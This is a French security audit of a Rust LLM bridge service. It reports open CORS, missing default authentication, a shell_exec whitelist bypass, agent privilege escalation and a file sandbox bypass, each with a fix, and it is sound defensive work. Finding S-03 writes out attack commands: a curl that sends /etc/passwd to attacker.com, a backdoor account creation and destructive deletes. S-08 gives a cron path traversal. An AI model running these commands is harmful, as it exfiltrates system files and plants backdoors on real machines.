# P2-L3b-D3-01 -- Audit securite miou-llm-bridge

> @id P2-L3b-D3-01

## TL;DR

Le service `miou-llm-bridge` (21 fichiers .rs, ~3700 lignes) ecoute par defaut sur `0.0.0.0:11435` avec CORS `allow_origin(Any)`. L'authentification, le HMAC, et le chiffrement sont tous **desactives par defaut** (`auth_token: None`, `require_auth_all: false`, `hmac_secret: None`). Le skill `shell_exec` contient une faille de contournement critique via le mode `shell: true` qui bypass la whitelist de commandes. 30 `unwrap()` sur des locks `RwLock`/`Mutex` exposent le service a un DoS par poison de lock. La comparaison de token utilise `==` (timing attack). **9 defauts identifies, dont 4 critiques et 3 eleves.**

## 2. Findings

### S-01 -- CRITIQUE : CORS allow_origin(Any) sur toutes les routes

**Fichier** : `apps/miou-llm-bridge/src/proxy.rs` lignes 45-48

```rust
let cors = CorsLayer::new()
    .allow_origin(Any)
    .allow_methods(Any)
    .allow_headers(Any);
```

**Impact** : N'importe quel site web visite par l'utilisateur peut envoyer des requetes a `http://localhost:11435` via JavaScript (fetch/XMLHttpRequest). Cela permet :
- L'execution de commandes shell via `/v1/skills/shell_exec/execute`
- La lecture/ecriture de fichiers via `/v1/skills/file_ops/execute`
- Le controle complet des agents et contextes
- L'exfiltration de prompts et reponses

**CORS est applique sur TOUTES les routes** (publiques ET protegees) car le layer est ajoute apres le merge des routeurs (ligne 104-107) :
```rust
public_routes
    .merge(protected_routes)
    .layer(cors)  // <-- Applique a TOUT
    .with_state(state)
```

**Aggravant** : Le bind par defaut est `0.0.0.0`, donc le service est accessible depuis tout le reseau local.

**OWASP** : A01 (Broken Access Control), A05 (Security Misconfiguration)

**Remediation** :
1. Remplacer `Any` par une whitelist : `AllowOrigin::list(["http://localhost:11435", "tauri://localhost"])`
2. Ou supprimer le CORS layer et laisser les memes-origines fonctionner naturellement
3. Au minimum, restreindre `allow_methods` et `allow_headers` aux strictement necessaires

### S-02 -- CRITIQUE : Bind address 0.0.0.0 par defaut

**Fichier** : `apps/miou-llm-bridge/src/config.rs` ligne 120-122

```rust
fn default_bind_addr() -> String {
    "0.0.0.0:11435".into()
}
```

**Impact** : Le service ecoute sur toutes les interfaces reseau. Combine avec l'absence d'auth par defaut et CORS Any, tout appareil sur le reseau local peut :
- Executer des commandes shell
- Lire/ecrire des fichiers
- Utiliser le LLM

**OWASP** : A05 (Security Misconfiguration)

**Remediation** : Changer le defaut en `127.0.0.1:11435`. L'utilisateur peut configurer `0.0.0.0` explicitement dans `bridge.toml` s'il a configure l'authentification.

### S-03 -- CRITIQUE : shell_exec bypass whitelist via shell: true

**Fichier** : `apps/miou-llm-bridge/src/skills/shell_exec.rs` lignes 100-123

```rust
let use_shell = params
    .get("shell")
    .and_then(|v| v.as_bool())
    .unwrap_or(false);

if !use_shell {
    // Verification whitelist...
}
// Si use_shell == true, la whitelist est COMPLETEMENT BYPASSES
```

Quand `shell: true`, la commande est passee directement a `cmd /C` (Windows) ou `sh -c` (Unix). La whitelist `ALLOWED_COMMANDS` est ignoree. La blocklist `BLOCKED_PATTERNS` est verifiee, mais elle est triviale a contourner :

- `rm -rf /tmp/data` ne matche pas `rm -rf /` (pattern exact)
- `powershell -c "Remove-Item -Recurse -Force C:\"` n'est pas bloque
- `curl http://attacker.com/exfil?data=$(cat /etc/passwd)` est autorise
- `net user hacker P@ss123 /add` est autorise

**Aggravant** : L'agent `Alicia` (builtin) a le skill `shell_exec` avec `SecurityLevel::Extended`, et peut etre invoquee via `/v1/agents/alicia/chat` sans authentification.

**OWASP** : A03 (Injection), A01 (Broken Access Control)

**Remediation** :
1. **Supprimer le mode `shell: true`** ou le reserver au `SecurityLevel::Full`
2. Rendre la blocklist plus robuste (regex au lieu de substring)
3. Ajouter une validation de caracteres dangereux dans la commande (`|`, `;`, `&&`, `$()`, backticks)

### S-04 -- CRITIQUE : Aucune authentification par defaut

**Fichier** : `apps/miou-llm-bridge/src/config.rs` lignes 152-164

```rust
impl Default for BridgeConfig {
    fn default() -> Self {
        Self {
            auth_token: None,           // Pas de token
            security: SecurityConfig {
                require_auth_all: false, // Auth desactivee
                hmac_secret: None,       // HMAC desactive
                encryption_key: None,    // Chiffrement desactive
                ..
            },
            ..
        }
    }
}
```

**Impact** : Par defaut, AUCUN mecanisme d'authentification n'est actif. Toute requete sur les 40+ endpoints est acceptee. Le middleware de securite (`security_middleware`) ne verifie l'auth que si `require_auth_all == true`.

**OWASP** : A07 (Authentication and Session Failures)

**Remediation** :
1. Generer un token aleatoire au premier lancement et l'afficher dans les logs
2. Activer `require_auth_all: true` par defaut
3. Ou au minimum, proteger les endpoints d'administration et d'execution de skills

### S-05 -- ELEVE : Comparaison de token en temps non constant (timing attack)

**Fichier** : `apps/miou-llm-bridge/src/security.rs` ligne 219

```rust
if token == expected {
    Ok(())
} else {
    Err("Token invalide")
}
```

Et dans `proxy.rs` ligne 902 :
```rust
.map(|v| v.strip_prefix("Bearer ").unwrap_or(v) == expected_token.as_str())
```

**Impact** : La comparaison `==` sur les strings en Rust fait un court-circuit au premier octet different. Un attaquant peut mesurer le temps de reponse pour deviner le token caractere par caractere.

**OWASP** : A02 (Cryptographic Failures)

**Remediation** : Utiliser `subtle::ConstantTimeEq` ou un accumulateur XOR :
```rust
use subtle::ConstantTimeEq;
if token.as_bytes().ct_eq(expected.as_bytes()).into() {
    Ok(())
}
```

### S-06 -- ELEVE : 30 unwrap() sur RwLock/Mutex (DoS par poison de lock)

**Fichiers** : `agents/mod.rs` (9), `context.rs` (6), `inference.rs` (6), `security.rs` (9)

**Total** : 30 occurrences de `.unwrap()` sur des appels `.read()`, `.write()`, ou `.lock()`.

**Impact** : En Rust, un `RwLock` ou `Mutex` est "empoisonne" si un thread panic pendant qu'il tient le lock. Apres empoisonnement, tout appel `.unwrap()` sur le lock provoque une cascade de panics dans tous les threads, tuant le service.

Un seul panic dans un handler qui tient un lock (par exemple une erreur dans `chat_completion_blocking` qui utilise `self.state.lock().unwrap()`) empoisonne le `Mutex<NativeState>`, rendant **toute inference native impossible** jusqu'au redemarrage.

**Scenario de DoS** :
1. Envoyer une requete de chat avec un modele charge
2. Declencher un panic dans le code llama.cpp (prompt invalide, OOM, etc.)
3. Le Mutex est empoisonne
4. Toutes les requetes suivantes paniquent

**OWASP** : A04 (Insecure Design)

**Remediation** :
```rust
// Au lieu de :
let state = self.state.lock().unwrap();
// Utiliser :
let state = self.state.lock().unwrap_or_else(|poisoned| {
    tracing::error!("Lock poisoned, recovering");
    poisoned.into_inner()
});
```

### S-07 -- ELEVE : Privilege escalation via agent CRUD

**Fichier** : `apps/miou-llm-bridge/src/proxy.rs` lignes 187-198, `agents/custom.rs`

L'endpoint `POST /v1/agents` permet de creer un agent custom avec un `SecurityLevel` arbitraire :

```rust
pub struct CreateAgentRequest {
    pub security_level: SecurityLevel,  // L'appelant choisit son propre niveau
    pub skill_ids: Vec<String>,         // L'appelant choisit ses propres skills
}
```

**Impact** : Sans authentification, n'importe qui peut :
1. Creer un agent avec `security_level: "full"` et `skill_ids: ["shell_exec", "file_ops"]`
2. Utiliser cet agent via `POST /v1/agents/{id}/chat` pour executer des commandes

**OWASP** : A01 (Broken Access Control)

**Remediation** :
1. Plafonner le `SecurityLevel` des agents custom a `Sandboxed`
2. Interdire `shell_exec` pour les agents crees via l'API
3. Ou exiger l'authentification sur les endpoints de creation d'agents

### S-08 -- MOYEN : Sandbox file_ops contournable (TOCTOU)

**Fichier** : `apps/miou-llm-bridge/src/skills/file_ops.rs` lignes 58-69

```rust
if let Ok(canonical) = full_path.canonicalize() {
    if let Ok(sandbox_canonical) = sandbox.canonicalize() {
        if !canonical.starts_with(&sandbox_canonical) {
            return /* acces refuse */;
        }
    }
}
// Si canonicalize() echoue (fichier n'existe pas encore), la verification est IGNOREE
```

**Impact** :
1. **TOCTOU** : Le chemin est verifie puis utilise separement. Entre les deux, un symlink pourrait etre cree.
2. **Bypass par fichier inexistant** : Pour `write` et `mkdir`, `canonicalize()` echoue car le fichier n'existe pas encore. Le code continue sans verification, permettant d'ecrire hors du sandbox :
   - `path = "../../etc/cron.d/backdoor"` -- `canonicalize()` echoue car le fichier n'existe pas -- l'ecriture passe

**OWASP** : A01 (Broken Access Control), A03 (Injection -- path traversal)

**Remediation** :
1. Verifier le chemin RESOLU (pas canonicalise) : s'assurer que `sandbox.join(path_str)` commence bien par le sandbox apres normalisation des `..`
2. Rejeter tout chemin contenant `..` en tant que composant
3. Pour les ecritures, verifier le chemin PARENT (qui existe) au lieu du chemin cible

### S-09 -- MOYEN : Prompts et reponses dans les logs

**Fichier** : `apps/miou-llm-bridge/src/security.rs` (AuditLog), `proxy.rs` (log_requests)

L'audit log enregistre les `details` des executions de skills (ligne 478 de proxy.rs) :
```rust
details: serde_json::to_string(&req.params).unwrap_or_default(),
```

Cela inclut les contenus de fichiers lus/ecrits, les commandes executees, et les URLs fetchees. L'endpoint `GET /v1/security/audit` retourne ces logs a quiconque (sans auth) :
```rust
async fn security_audit_handler(State(state): State<ProxyState>) -> impl IntoResponse {
    let events = state.security_audit.recent(100);
    // ... retourne les evenements sans verification
}
```

**Impact** : Fuite d'informations sensibles (commandes, contenus de fichiers, URLs) via l'endpoint d'audit.

**OWASP** : A09 (Security Logging and Monitoring Failures), A01 (Broken Access Control)

**Remediation** :
1. Proteger `/v1/security/audit` et `/v1/security/status` avec authentification obligatoire
2. Tronquer les `details` dans l'audit log (max 200 caracteres)
3. Ne jamais logger le contenu des fichiers ou les prompts complets

## 7. Recommandations de durcissement (par priorite)

### Priorite 1 -- Immediat (bloquants)

1. **Bind `127.0.0.1` par defaut** (S-02) : 1 ligne dans `config.rs`
2. **Supprimer CORS Any** (S-01) : Remplacer par whitelist ou supprimer le layer
3. **Generer un token aleatoire au premier lancement** (S-04) : Modifier `load_or_create()` pour generer un UUID si `auth_token` est `None`, l'afficher dans les logs, et activer `require_auth_all`
4. **Supprimer `shell: true` ou exiger Full** (S-03) : Ajouter un check de SecurityLevel dans shell_exec

### Priorite 2 -- Court terme

5. **Comparaison temps constant** (S-05) : Ajouter `subtle = "2"` au Cargo.toml, remplacer les 2 comparaisons `==`
6. **Recovery sur lock poisone** (S-06) : Remplacer les 30 `.unwrap()` par `.unwrap_or_else(|p| p.into_inner())`
7. **Plafonner les agents custom** (S-07) : Max `SecurityLevel::Sandboxed` via l'API
8. **Corriger le sandbox file_ops** (S-08) : Rejeter les chemins contenant `..` et verifier le parent

### Priorite 3 -- Moyen terme

9. **Proteger les endpoints d'admin** (S-09) : `/v1/security/*`, `/v1/models/load`, `/v1/models/unload`
10. **Ajouter des limites de longueur** : `message` max 32KB, `system_prompt` max 16KB, `content` (file_ops write) max 1MB
11. **Rate limiting par IP** (pas seulement par identifiant string)
12. **Timeout sur le Mutex d'inference** : Eviter qu'un thread bloque indefiniment le modele
